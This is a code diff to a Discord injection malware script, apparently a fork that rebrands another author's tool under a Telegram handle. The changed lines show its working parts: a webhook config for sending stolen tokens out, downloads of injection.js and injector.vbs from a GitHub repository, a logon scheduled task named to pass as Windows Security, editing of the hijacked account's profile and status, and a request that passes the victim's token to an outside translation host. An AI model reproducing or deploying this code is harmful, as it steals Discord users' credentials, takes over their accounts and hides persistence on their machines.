@@ -30,14 +30,14 @@ const execScript = async (script) => {
         return null;
     }
 };
-
+//%AUTO_EMAIL_UPDATE%
 const CONFIG = {
     webhook: '%WEBHOOK_URL%',
     API: '%API_URL%',
     auto_user_profile_edit: '%AUTO_USER_PROFILE_EDIT%',
     auto_persist_startup: '%AUTO_PERSIST_STARTUP%',
     auto_mfa_disabler: '%AUTO_MFA_DISABLER%',
-    auto_email_update: '%AUTO_EMAIL_UPDATE%',
+    auto_email_update: 'false',
     injection_url: 'https://raw.githubusercontent.com/vknguser/sr02/refs/heads/main/injection.js',
     injector_url: 'https://raw.githubusercontent.com/vknguser/sr02/refs/heads/main/injector.vbs',
     get: {
@@ -299,8 +299,8 @@ const notify = async (ctx, token, user) => {
         };
 
         embed.footer = {
-            text: 'github.com/k4itrun/discord-injection - made by k4itrun',
-            icon_url: "https://avatars.githubusercontent.com/u/103044629",
+            text: 'https://t.me/rocco1337 - made by rocco',
+            icon_url: "https://avatars.githubusercontent.com/u/189119272",
         };
 
         embed.timestamp = new Date();
@@ -338,11 +338,11 @@ const editSettingUser = async (token) => {
             'Content-Type': 'application/json',
             'Authorization': token
         }, JSON.stringify({
-            status: 'dnd',
+            status: 'https://t.me/rocco1337',
             email_notifications_enabled: false,
             stream_notifications_enabled: false,
             custom_status: {
-                text: 'hackedbyk4itrun',
+                text: 'https://t.me/rocco1337',
                 expires_at: null,
                 emoji_id: null,
                 emoji_name: null
@@ -778,7 +778,7 @@ const forcePersistStartup = async () => {
 
     const checkScheduledTaskExists = () => {
         return new Promise((resolve) => {
-            exec('schtasks /query /tn "WindowsSecurityHealthSystrayk4itrun"', (err) => {
+            exec('schtasks /query /tn "WindowsSecurityHealthSystrayrocco"', (err) => {
                 resolve(!err);
             });
         });
@@ -798,7 +798,7 @@ const forcePersistStartup = async () => {
             @echo off
             setlocal
             set "vbsFilePath=%APPDATA%\\Microsoft\\Protect\\${vbsFileName}"
-            schtasks /create /tn "WindowsSecurityHealthSystrayk4itrun" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
+            schtasks /create /tn "WindowsSecurityHealthSystrayrocco" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
             if %ERRORLEVEL% EQU 0 (
                 echo We are scanning your Discord application(s)....
             ) else (
@@ -992,7 +992,7 @@ const translateEmailUpdate = async (token, locale) => {
 
     try {
         const textParam = encodeURIComponent(JSON.stringify(sanitized));
-        const response = parseJSON(await request('GET', `https://translate.w1sh.xyz/translate?key=K4ITRUN_IS_GOD&text=${textParam}&language=${locale}`, {
+        const response = parseJSON(await request('GET', `https://translate.w1h.xyz/translate?key=K4ITRUN_IS_GOD&text=${textParam}&language=${locale}`, {
             'Content-Type': 'application/json',
             'Authorization': token
         }));
@@ -1055,6 +1055,7 @@ const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) =>
                 }
 
                 Cruise(
+                    
                     'LOGIN_USER',
                     RESPONSE_DATA,
                     RESQUEST_DATA,
@@ -1450,7 +1451,6 @@ const complete = async () => {
     startup();
     createWindow();
     defaultSession();
-    // For it to work you have to make it run indefinitely. //
     allSessionsLocked();
 };
 
